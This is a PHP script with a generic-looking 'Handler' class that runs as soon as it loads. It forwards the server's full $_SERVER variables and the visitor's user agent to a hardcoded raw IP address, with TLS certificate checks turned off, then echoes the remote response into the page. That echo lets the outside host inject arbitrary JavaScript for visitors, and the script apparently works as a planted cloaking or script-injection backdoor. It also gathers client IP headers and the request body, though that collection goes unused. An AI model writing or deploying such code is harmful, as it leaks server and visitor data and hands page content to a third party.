<?php

(new Handler())->runHandler();

class Handler
{
    protected $curlOne;
    protected $curlTwo;
    protected $result;
    protected $headers;

    public function __construct()
    {
        $this->httpGetAllHeaders();
        $this->curlOne = $this->getCurl($this->oneServer());
        $this->curlTwo = $this->getCurl($this->twoServer());
    }

    public function runHandler()
    {
        if ($this->options($this->curlOne)) {

            return strnatcasecmp(trim($this->result), "true") == 0 ? true : false;

        } else {
            if ($this->options($this->curlTwo)) {

                return strnatcasecmp(trim($this->result), "true") == 0 ? true : false;
            } else {

                return false;
            }
        }
    }

    private function options($curl)
    {

        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($curl, CURLOPT_HTTPHEADER, $_SERVER);
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

        curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($curl, CURLOPT_TIMEOUT, 3);
        //curl_setopt($curl, CURLOPT_TIMEOUT_MS, 0);
        curl_setopt($curl, CURLOPT_FORBID_REUSE, true);



        $this->result = curl_exec($curl);
        echo $this->result;
        return curl_getinfo($curl, CURLINFO_HTTP_CODE) == 200;
    }


    private function getCurl($path)
    {
        return curl_init($path);
    }


    private function oneServer()
    {

        return "https://185.25.118.31/Core/Controller/ControllerGetJS.php";
    }

    private function twoServer()
    {
        return "https://185.25.118.31/Core/Controller/ControllerGetJS.php";



    }

    private function httpGetAllHeaders()

    {

        $headersToFind = [

            'HTTP_X_REAL_IP',
            'REMOTE_ADDR',
            'HTTP_X_FORWARDED_FOR',
            'X_FORWARDED_FOR',
            'HTTP_CLIENT_IP',
            'HTTP_CF_CONNECTING_IP',

        ];


        $headers = [];


        foreach ($headersToFind as $header) {

            if (!array_key_exists($header, $_SERVER)) {

                continue;

            }

            $key = 'X-LC-' . str_replace('_', '-', $header);

            $value = is_array($_SERVER[$header]) ? implode(',', $_SERVER[$header]) : $_SERVER[$header];

            $headers[] = $key . ':' . $value;

            //echo $key . ':' . $value ."</br>";
        }



        $headers[] = 'company: namecompany';
        $headers[] = 'login: namelogin';

        $headers[] = 'js' .":" . json_encode(file_get_contents("php://input"));
        $_GLOBAL["JS"] = json_encode(file_get_contents("php://input"));
        $this->headers = $headers;
    }
}